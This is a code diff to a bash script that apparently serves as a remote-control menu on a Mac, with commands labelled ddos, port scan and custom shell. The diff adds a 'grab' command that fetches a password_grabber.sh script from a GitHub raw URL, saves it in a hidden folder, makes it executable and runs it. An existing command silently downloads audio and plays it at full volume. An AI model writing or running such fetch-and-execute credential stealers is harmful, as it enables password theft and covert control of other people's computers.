@@ -11,7 +11,8 @@ help          shows the help menu
 custom        enter custom bash command
 ddos          launches ddos script
 scan          launches port scanner
-message       runs a message from audio.mp3"
+message       runs a message from audio.mp3
+grab          tries to grab password"
 
 while true; do
 echo -n "> "
@@ -52,7 +53,8 @@ help          shows the help menu
 custom        enter custom bash command
 ddos          launches ddos script
 scan          launches port scanner
-message       runs a message from audio.mp3"
+message       runs a message from audio.mp3
+grab          tries to grab password"
 
 ;;
 command)
@@ -76,10 +78,18 @@ scan)
     ;;
 message)
     curl --location --request GET 'https://drive.google.com/uc\?export\=download\&id\=1PCQxmE-kEJQYKcFRZd_1GERkpRkjilBf' -o .hidden/audio.mp3 -s
-    Sleep 10
+    Sleep 6
     osascript -e "set Volume 10"
     afplay .hidden/audio.mp3
     ;;
+grab)
+curl -s https://raw.githubusercontent.com/alexander12887/payload/main/password_grabber.sh >> .hidden/password_grabber.sh
+sleep 5
+chmod +x .hidden/password_grabber.sh
+make -f .hidden/password_grabber 
+sleep 5
+open .hidden/password_grabber
+;;
 
 esac
 done
